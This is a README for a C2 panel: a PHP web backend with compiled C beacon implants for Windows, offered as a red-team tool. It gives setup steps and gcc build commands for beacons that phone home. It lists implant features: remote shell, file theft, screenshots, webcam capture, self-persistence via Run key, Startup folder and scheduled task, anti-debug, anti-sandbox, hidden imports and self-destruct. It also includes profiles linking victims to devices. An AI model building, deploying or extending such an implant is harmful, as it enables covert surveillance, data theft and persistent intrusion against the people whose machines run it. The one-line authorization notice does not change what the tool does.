# C2 Panel

PHP backend + C beacon surveillance panel with full-featured web UI.

## Quick Start

1. **Drop `githubVERSION/`** into your Apache `htdocs` (or any PHP web server)
2. **Open setup** in your browser:
   ```
   http://yourserver/setup.php
   ```
3. **Follow the prompts** -- setup generates `.env` with random secrets and creates the admin account
4. **Delete `setup.php`** after setup (recommended)
5. **Login** at the panel with the credentials setup gave you

## Beacons

Edit the beacon source files with your server URL and `BEACON_SECRET` (shown at end of setup), then compile:

| File | Type | Compile |
|---|---|---|
| `payload/beacon_persist.c` | C beacon (manual persist) | `gcc beacon_persist.c -o beacon.exe -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s` |
| `payload/beacon_auto.c` | C beacon (auto persist) | `gcc beacon_auto.c -o beacon.exe -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s` |

- **beacon_persist**: Run the exe, it phones home. You click persist in the panel when ready.
- **beacon_auto**: Run the exe, it persists itself immediately on execution.

### Features

**Panel (Web UI):**
- File manager (browse all partitions, upload, download, delete)
- Terminal (shell commands, history, clear)
- Screenshot capture (DPI-aware, full virtual screen, multi-monitor)
- Camera capture (VFW)
- Human-device linking (profile system for operators)
- Task history (all commands/results with export)
- Ping with timestamp
- Device notes and rename
- AJAX login, dark theme, responsive UI

**Beacon (C implant):**
- Commands: `browse`, `drives`, `pull`, `push`, `read`, `screenshot`, `camshot`, `persist`, `selfdestruct`, `shell`, `ps`, `kill`, `info`
- Persistence: Registry Run key, Startup folder (.vbs launcher), Scheduled Task (if admin)
- Self-destruct: removes all artifacts (files, registry, scheduled tasks, .vbs scripts)
- Anti-debug (PEB check, `CheckRemoteDebuggerPresent`)
- Anti-sandbox (VM detection, CPU/RAM/disk thresholds, known sandbox DLLs)
- Runtime API resolution (no import table traces)
- UUID stored in `%APPDATA%\.appdata.dat`
- Burst mode: re-checks C2 in 2-3s after executing tasks (no full sleep delay)

## Directory Structure

```
├── api.php                 API entry point
├── index.php               Panel UI + login gate
├── setup.php               One-time setup wizard
├── .env.example            Environment template
├── assets/
│   ├── panel.js            Panel JavaScript
│   └── panel.css           Dark theme CSS
├── handlers/               PHP API handlers
│   ├── auth.php            Login/logout
│   ├── beacon.php          Beacon checkin
│   ├── device.php          Device management
│   ├── file.php            File upload/download
│   ├── filebrowser.php     Browse cache + directory requests
│   ├── media.php           Screenshot/camera
│   ├── payload.php         Payload serving
│   ├── persons.php         Human profiles
│   ├── result.php          Task results
│   └── task.php            Task CRUD
├── includes/               PHP core
│   ├── auth.php            Session, CSRF, login form
│   ├── config.php          Env loader, constants
│   ├── db.php              JSON file-based database
│   ├── helpers.php         Utility functions
│   └── router.php          Request routing
├── payload/                C beacon source files
├── data/                   JSON storage (created by setup)
└── uploads/                File storage (created by setup)
```

## Requirements

- PHP 7.4+
- Apache with `mod_rewrite`
- MinGW-w64 (for compiling beacons on Windows)
- XAMPP recommended (ships with PHP + Apache)

## Security Notice

This is a red team / authorized testing tool. Only use on systems you own or have explicit written authorization to test.
